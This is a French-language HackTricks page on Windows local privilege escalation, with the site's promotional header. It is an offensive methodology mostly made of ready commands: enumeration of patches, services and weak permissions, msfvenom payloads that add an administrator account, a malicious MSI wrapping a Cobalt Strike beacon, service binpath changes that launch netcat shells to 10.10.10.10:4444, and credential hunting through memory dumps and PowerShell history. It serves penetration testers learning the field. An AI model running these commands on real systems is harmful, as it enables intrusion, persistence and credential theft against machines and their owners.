# Élévation de privilèges locaux Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Meilleur outil pour rechercher des vecteurs d'élévation de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale de Windows

### Jetons d'accès

**Si vous ne savez pas ce que sont les jetons d'accès Windows, lisez la page suivante avant de continuer :**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Si vous ne savez pas ce que signifie l'un des acronymes utilisés dans le titre de cette section, lisez la page suivante avant de continuer** :

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Niveaux d'intégrité

**Si vous ne savez pas ce que sont les niveaux d'intégrité dans Windows, vous devriez lire la page suivante avant de continuer :**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Contrôles de sécurité Windows

Il existe différentes choses dans Windows qui pourraient **vous empêcher d'énumérer le système**, exécuter des exécutables ou même **détecter vos activités**. Vous devriez **lire** la **page** suivante et **énumérer** tous ces **mécanismes de défense** avant de commencer l'énumération pour l'élévation de privilèges :

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Infos système

### Énumération des informations de version

Vérifiez si la version de Windows a une vulnérabilité connue (vérifiez également les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de Version

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, montrant la **surface d'attaque massive** qu'un environnement Windows présente.

**Sur le système**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas intègre watson)_

**Localement avec des informations système**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits :**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environnement

Des identifiants/Informations juteuses enregistrés dans les variables d'environnement ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historique PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers de transcription PowerShell

Vous pouvez apprendre comment activer cela sur [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Journalisation des modules PowerShell

Elle enregistre les détails de l'exécution de la pipeline de PowerShell. Cela inclut les commandes exécutées, y compris les invocations de commandes et une partie des scripts. Il se peut qu'elle ne contienne pas tous les détails de l'exécution et les résultats de sortie.\
Vous pouvez activer cela en suivant le lien de la dernière section (Fichiers de transcription) mais en activant "Journalisation des modules" au lieu de "Transcription PowerShell".
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour afficher les 15 derniers événements des journaux PowersShell, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Journalisation des **blocs de script PowerShell**

Elle enregistre des blocs de code au moment de leur exécution, capturant ainsi l'activité complète et le contenu intégral du script. Elle conserve une trace d'audit complète de chaque activité qui peut être utilisée ultérieurement pour des analyses forensiques et l'étude des comportements malveillants. Elle enregistre toute l'activité au moment de l'exécution, fournissant ainsi tous les détails.
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements de journalisation des blocs de scripts peuvent être trouvés dans l'Observateur d'événements Windows sous le chemin suivant : _Journaux des applications et des services > Microsoft > Windows > Powershell > Opérationnel_\
Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lecteurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées en utilisant http**S** mais http.

Commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant ce qui suit :
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Si vous obtenez une réponse telle que :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` est égal à `1`.

Alors, **c'est exploitable.** Si la dernière entrée du registre est égale à 0, alors, l'entrée WSUS sera ignorée.

Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils comme : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Ce sont des scripts d'exploits armés MiTM pour injecter des 'fausses' mises à jour dans le trafic WSUS non-SSL.

Lisez la recherche ici :

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lisez le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
En gros, voici la faille que ce bug exploite :

> Si nous avons le pouvoir de modifier notre proxy utilisateur local, et que Windows Updates utilise le proxy configuré dans les paramètres d'Internet Explorer, nous avons donc le pouvoir d'exécuter [PyWSUS](https://github.com/GoSecure/pywsus) localement pour intercepter notre propre trafic et exécuter du code en tant qu'utilisateur élevé sur notre actif.
>
> De plus, puisque le service WSUS utilise les paramètres de l'utilisateur actuel, il utilisera également son magasin de certificats. Si nous générons un certificat auto-signé pour le nom d'hôte WSUS et ajoutons ce certificat dans le magasin de certificats de l'utilisateur actuel, nous pourrons intercepter à la fois le trafic WSUS HTTP et HTTPS. WSUS n'utilise aucun mécanisme de type HSTS pour mettre en œuvre une validation de confiance lors de la première utilisation sur le certificat. Si le certificat présenté est approuvé par l'utilisateur et a le bon nom d'hôte, il sera accepté par le service.

Vous pouvez exploiter cette vulnérabilité en utilisant l'outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu'il est libéré).

## KrbRelayUp

C'est essentiellement une élévation de privilèges **locale** universelle sans correction dans les environnements de **domaine** Windows où **la signature LDAP n'est pas appliquée,** où **l'utilisateur a des droits sur lui-même** (pour configurer **RBCD**) et où **l'utilisateur peut créer des ordinateurs dans le domaine.**\
Toutes les **exigences** sont satisfaites avec les **paramètres par défaut**.

Trouvez l'**exploit sur** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Même si l'attaque est Pour plus d'informations sur le déroulement de l'attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 registres sont **activés** (la valeur est **0x1**), alors les utilisateurs de n'importe quel privilège peuvent **installer** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Charges utiles Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter, vous pouvez automatiser cette technique en utilisant le module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire courant un binaire MSI Windows pour élever les privilèges. Ce script génère un installateur MSI précompilé qui demande l'ajout d'un utilisateur/groupe (vous aurez donc besoin d'un accès GIU) :
```
Write-UserAddMSI
```
Exécutez simplement le binaire créé pour élever les privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un MSI wrapper en utilisant ces outils. Notez que vous pouvez envelopper un fichier "**.bat**" si vous voulez **juste** **exécuter** des **lignes de commande**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Créer MSI avec WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Créer MSI avec Visual Studio

* **Générez** avec Cobalt Strike ou Metasploit un **nouveau payload EXE TCP Windows** dans `C:\privesc\beacon.exe`
* Ouvrez **Visual Studio**, sélectionnez **Créer un nouveau projet** et tapez "installer" dans la barre de recherche. Sélectionnez le projet **Setup Wizard** et cliquez sur **Suivant**.
* Donnez un nom au projet, comme **AlwaysPrivesc**, utilisez **`C:\privesc`** pour l'emplacement, sélectionnez **placer la solution et le projet dans le même répertoire**, et cliquez sur **Créer**.
* Continuez à cliquer sur **Suivant** jusqu'à l'étape 3 sur 4 (choisir les fichiers à inclure). Cliquez sur **Ajouter** et sélectionnez le payload Beacon que vous venez de générer. Puis cliquez sur **Terminer**.
* Mettez en surbrillance le projet **AlwaysPrivesc** dans l'**Explorateur de solutions** et dans les **Propriétés**, changez **TargetPlatform** de **x86** à **x64**.
* Il y a d'autres propriétés que vous pouvez changer, telles que l'**Auteur** et le **Fabricant** qui peuvent rendre l'application installée plus légitime.
* Faites un clic droit sur le projet et sélectionnez **Afficher > Actions personnalisées**.
* Faites un clic droit sur **Installer** et sélectionnez **Ajouter une action personnalisée**.
* Double-cliquez sur **Dossier d'application**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantira que le payload beacon est exécuté dès que l'installateur est lancé.
* Sous les **Propriétés de l'action personnalisée**, changez **Run64Bit** en **Vrai**.
* Enfin, **construisez-le**.
* Si l'avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` est affiché, assurez-vous d'avoir réglé la plateforme sur x64.

### Installation MSI

Pour exécuter l'**installation** du fichier malveillant `.msi` en **arrière-plan :**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always\_install\_elevated_

## Antivirus et Détecteurs

### Paramètres d'Audit

Ces paramètres déterminent ce qui est **consigné**, donc vous devriez y prêter attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, est intéressant pour savoir où les journaux sont envoyés
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** vous permet de **gérer le mot de passe de l'administrateur local** (qui est **randomisé**, unique et **changé régulièrement**) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Si votre utilisateur dispose de suffisamment de permissions, vous pourriez être en mesure de lire les mots de passe des administrateurs locaux.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Si actif, **les mots de passe en texte clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**Plus d'informations sur WDigest dans cette page**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### Protection LSA

Microsoft dans **Windows 8.1 et versions ultérieures** a fourni une protection supplémentaire pour le LSA afin de **prévenir** les processus non fiables de pouvoir **lire sa mémoire** ou d'injecter du code.\
[**Plus d'infos sur la Protection LSA ici**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### Credentials Guard

**Credential Guard** est une nouvelle fonctionnalité dans Windows 10 (éditions Enterprise et Education) qui aide à protéger vos identifiants sur une machine contre des menaces telles que le pass the hash.\
[**Plus d'informations sur Credentials Guard ici.**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### Identifiants mis en cache

Les **identifiants de domaine** sont utilisés par les composants du système d'exploitation et sont **authentifiés** par l'**Autorité de Sécurité Locale** (LSA). Typiquement, les identifiants de domaine sont établis pour un utilisateur lorsque un package de sécurité enregistré authentifie les données de connexion de l'utilisateur.\
[**Plus d'infos sur les identifiants mis en cache ici**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utilisateurs & Groupes

### Énumérer les Utilisateurs & Groupes

Vous devriez vérifier si certains des groupes auxquels vous appartenez ont des permissions intéressantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pourriez être capable d'escalader les privilèges**. Apprenez-en plus sur les groupes privilégiés et comment les exploiter pour escalader les privilèges ici :

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulation de jetons

**En savoir plus** sur ce qu'est un **jeton** sur cette page : [**Jetons Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Consultez la page suivante pour **découvrir des jetons intéressants** et comment les exploiter :

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Utilisateurs connectés / Sessions
```
qwinsta
klist sessions
```
### Dossiers personnels
```
dir C:\Users
Get-ChildItem C:\Users
```
### Politique de mots de passe
```
net accounts
```
### Obtenir le contenu du presse-papiers
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours

### Permissions des fichiers et dossiers

Tout d'abord, en listant les processus, **vérifiez la présence de mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture sur le dossier du binaire pour exploiter de possibles attaques de [**Détournement de DLL**](dll-hijacking.md) :
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Toujours vérifier la présence éventuelle de [**débogueurs electron/cef/chromium** en cours d'exécution, vous pourriez en abuser pour élever les privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Vérification des permissions des binaires des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Extraction de mots de passe en mémoire

Vous pouvez créer un dump de mémoire d'un processus en cours d'exécution en utilisant **procdump** de sysinternals. Des services comme FTP ont les **identifiants en clair dans la mémoire**, essayez de dumper la mémoire et de lire les identifiants.
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applications avec interface graphique non sécurisées

**Les applications s'exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD ou de parcourir des répertoires.**

Exemple : "Aide et support de Windows" (Windows + F1), recherchez "invite de commandes", cliquez sur "Cliquez pour ouvrir l'invite de commandes"

## Services

Obtenez une liste des services :
```
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilège requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si les "Utilisateurs authentifiés" peuvent modifier un service quelconque :
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Vous pouvez télécharger accesschk.exe pour XP ici](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous rencontrez cette erreur (par exemple avec SSDPSRV) :

_Erreur système 1058 s'est produite._\
_Le service ne peut pas être démarré, soit parce qu'il est désactivé, soit parce qu'il n'a pas de périphériques activés qui lui sont associés._

Vous pouvez l'activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Prenez en compte que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution** à ce problème consiste à exécuter :
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin du binaire du service**

Si le groupe "Utilisateurs authentifiés" dispose de **SERVICE\_ALL\_ACCESS** sur un service, alors il peut modifier le binaire qui est exécuté par le service. Pour le modifier et exécuter **nc**, vous pouvez faire :
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrage du service
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
D'autres permissions peuvent être utilisées pour élever les privilèges :
**SERVICE_CHANGE_CONFIG** Peut reconfigurer le binaire du service
**WRITE_DAC :** Peut reconfigurer les permissions, menant à SERVICE_CHANGE_CONFIG
**WRITE_OWNER :** Peut devenir propriétaire, reconfigurer les permissions
**GENERIC_WRITE :** Hérite de SERVICE_CHANGE_CONFIG
**GENERIC_ALL :** Hérite de SERVICE_CHANGE_CONFIG

**Pour détecter et exploiter** cette vulnérabilité, vous pouvez utiliser _exploit/windows/local/service_permissions_

### Permissions faibles sur les binaires des services

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous avez **des permissions d'écriture sur le dossier** où le binaire est situé ([**DLL Hijacking**](dll-hijacking.md))**.**
Vous pouvez obtenir chaque binaire exécuté par un service en utilisant **wmic** (pas dans system32) et vérifier vos permissions en utilisant **icacls** :
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez également utiliser **sc** et **icacls** :
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissions de modification du registre des services

Vous devriez vérifier si vous pouvez modifier un registre de service.\
Vous pouvez **vérifier** vos **permissions** sur un registre de service en faisant :
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Vérifiez si les **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** disposent de FullControl. Dans ce cas, vous pouvez modifier le binaire qui sera exécuté par le service.

Pour changer le chemin du binaire exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permissions AppendData/AddSubdirectory dans le registre des services

Si vous avez cette permission sur un registre, cela signifie **que vous pouvez créer des sous-registres à partir de celui-ci**. Dans le cas des services Windows, cela est **suffisant pour exécuter du code arbitraire :**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Chemins de service non entre guillemets

Si le chemin vers un exécutable n'est pas entre guillemets, Windows essaiera d'exécuter chaque fin avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_ Windows essaiera d'exécuter :
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Pour lister tous les chemins de service non entre guillemets (à l'exception des services Windows intégrés)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit : _exploit/windows/local/trusted_service_path_\
Vous pouvez créer manuellement un binaire de service avec metasploit :
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Actions de récupération

Il est possible d'indiquer à Windows ce qu'il doit faire [lorsqu'un service échoue à l'exécution](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN). Si ce paramètre pointe vers un binaire et que ce binaire peut être réécrit, vous pourriez être en mesure d'élever vos privilèges.

## Applications

### Applications installées

Vérifiez les **permissions des binaires** (peut-être pouvez-vous en réécrire un et élever vos privilèges) et des **dossiers** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissions d'écriture

Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier spécial ou si vous pouvez modifier un binaire qui sera exécuté par un compte Administrateur (schedtasks).

Une manière de trouver des permissions de dossiers/fichiers faibles dans le système est de faire :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Exécution au démarrage

**Vérifiez si vous pouvez écraser un registre ou un binaire qui sera exécuté par un autre utilisateur.**\
